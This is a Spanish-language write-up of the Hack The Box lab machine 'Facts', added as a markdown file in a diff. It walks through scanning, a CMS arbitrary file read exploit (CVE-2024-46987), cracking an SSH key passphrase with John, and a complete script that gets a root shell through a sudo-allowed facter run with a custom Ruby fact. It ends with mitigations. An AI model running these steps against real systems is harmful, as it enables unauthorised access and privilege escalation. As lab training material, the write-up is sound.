@@ -1,0 +1,140 @@
+---
+title: "Hack The Box — Facts: Writeup (español)"
+description: "Máquina: Facts (Hack The Box)"
+date: "2026-03-17"
+tags:
+  - writeup
+tools:
+  []
+---
+# Hack The Box — Facts: Writeup (español)
+
+## Resumen
+
+Máquina: Facts (Hack The Box)
+
+Este documento resume los pasos realizados para comprometer la máquina: reconocimiento, explotación y post-explotación. También contiene los comandos usados y las flags obtenidas.
+
+## 1) Reconocimiento inicial
+
+- Escaneo de puertos (nmap): se encontraron los puertos 22 (SSH) y 80 (HTTP) expuestos.
+- Se intentó acceder al servicio web pero fallaba la conexión. El problema era la VPN: estábamos usando una conexión UDP a Hack The Box que no respondía correctamente. Al cambiar la conexión de la VPN a TCP, la web empezó a responder.
+
+Comando ejemplo de nmap:
+
+```
+nmap -sC -sV -oN nmap_initial.txt <IP>
+```
+
+## 2) Enumeración web
+
+- Al abrir la web, la aplicación devolvía errores intermitentes antes de cambiar la VPN a TCP.
+- Ejecutamos un escaneo de directorios con Gobuster (o herramienta similar) y encontramos el endpoint `/admin`.
+
+Ejemplo de comando Gobuster:
+
+```
+gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o gobuster.txt
+```
+
+## 3) Panel admin y creación de cuenta
+
+- El endpoint `/admin` permitía crear una cuenta de usuario y acceder a un dashboard.
+- En el dashboard se identificó que el sitio usa Cameleon CMS versión 2.9.0.
+
+## 4) Vulnerabilidades conocidas (CVE)
+
+- En el repositorio/registro público había al menos dos CVE relevantes para la versión detectada: `CVE-2024-46987` y `CVE-2025-2304`.
+- Una de estas vulnerabilidades permitió leer archivos arbitrarios en el servidor (la explotación se realizó mediante un script que requiere autenticación y token CSRF). El uso típico del script que usamos fue:
+
+```
+python3 CVE-2024-46987.py -u <URL> -l <USERNAME> -p <PASSWORD> <FILE_TO_READ>
+```
+
+- La otra vulnerabilidad permitía modificar/reescribir roles o permisos de usuarios, lo que facilita elevar privilegios sobre cuentas con menor privilegio.
+
+&gt; Nota: en la máquina se usó un script público para recuperar ficheros del sistema tras autenticarse en el CMS.
+
+## 5) Lectura de `/home/trivia/.ssh/authorized_keys` y obtención de la clave
+
+- Con el exploit de lectura obtuvimos el contenido de `/home/trivia/.ssh/authorized_keys` y detectamos una referencia a una clave `id_ed25519` (la clave privada correspondiente estaba disponible o pudo recuperarse de alguna manera).
+
+Proceso de cracking de clave SSH (resumen):
+
+1. Convertir la clave privada para John (si está cifrada) usando `ssh2john.py` (de la suite de John).
+2. Ejecutar John con `rockyou.txt` para intentar romper la passphrase:
+
+```
+python3 ssh2john.py id_ed25519 > id_ed25519.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
+```
+
+3. Si John encuentra la passphrase, usar la clave para conectar por SSH:
+
+```
+ssh -i id_ed25519 trivia@<IP>
+```
+
+## 6) Acceso inicial y enumeración
+
+- Logeándonos como `trivia` conseguimos acceso SHELL.
+- Hicimos enumeración básica (`id`, `whoami`, `ls -la`, `ps aux`, `env`, buscar archivos interesantes en el home) y comprobamos `sudo -l`.
+
+Salida relevante de `sudo -l`:
+
+- La cuenta `trivia` tenía permiso de ejecutar ciertos binarios con `NOPASSWD` (sin contraseña), entre ellos `/usr/bin/facter` con `--custom-dir` como opción aprovechable.
+
+## 7) Escalada a root mediante Facter (Ruby)
+
+- Identificamos que la máquina tenía `facter` (herramienta Ruby para facts de Puppet) ejecutable vía `sudo` por `trivia` sin contraseña.
+- Aprovechamos la opción de `--custom-dir` para cargar un módulo Ruby personalizado que ejecuta `/bin/sh`.
+
+Script `exploit.sh` usado (ejemplo):
+
+```
+#!/bin/bash
+mkdir -p /tmp/custom
+cat > /tmp/custom/shell.rb <<'EOF'
+Facter.add('shell') do
+  setcode do
+    exec('/bin/sh')
+  end
+end
+EOF
+chmod +x /tmp/custom/shell.rb
+
+# Ejecutar facter como root (según permisos sudo)
+sudo /usr/bin/facter --custom-dir=/tmp/custom shell
+```
+
+- Al ejecutar el comando anterior, obtuvimos una shell con privilegios más altos (dependiendo del sudoers) y localizamos la segunda flag.
+
+## 8) Flags
+
+- `user` flag: encontrada en el home de `william` (o en la ruta indicada durante la enumeración tras usar privilegios de `trivia`).
+- `root` flag: obtenida tras ejecutar el exploit vía `facter` y explorar el sistema como usuario con mayores privilegios.
+
+## 9) Resumen de herramientas y comandos clave
+
+- `nmap -sC -sV -oN nmap_initial.txt <IP>` — escaneo inicial
+- `gobuster dir -u http://<IP>/ -w <wordlist>` — descubrimiento de rutas
+- `python3 CVE-2024-46987.py -u <URL> -l <USER> -p <PASS> <FILE>` — exploit de lectura
+- `ssh2john.py id_ed25519 > id.hash` y `john --wordlist=rockyou.txt id.hash` — crack de passphrase
+- `ssh -i id_ed25519 trivia@<IP>` — acceso SSH
+- `sudo -l` — comprobar permisos sudo
+- Exploit Ruby/Facter: crear `/tmp/custom/shell.rb` y ejecutar `sudo /usr/bin/facter --custom-dir=/tmp/custom shell`
+
+## 10) Recomendaciones y mitigaciones
+
+- Actualizar Cameleon CMS a versiones parcheadas y aplicar políticas de seguridad para la gestión de plugins y módulos.
+- Restringir los binarios permitidos en sudoers y evitar NOPASSWD para comandos que acepten módulos o directorios personalizados.
+- Habilitar autenticación fuerte y rotación de claves SSH; no dejar claves privadas en lugares accesibles.
+
+## Referencias
+
+- Guía que servimos de referencia: https://medium.com/@orisimantov7/hackthebox-facts-machine-write-up-e5ed4feea83e
+- Lista de herramientas mencionadas: `nmap`, `gobuster`, `john`, `ssh2john.py`, `facter`.
+
+---
+
+Archivo creado: writeups/Facts_WRITEUP.md
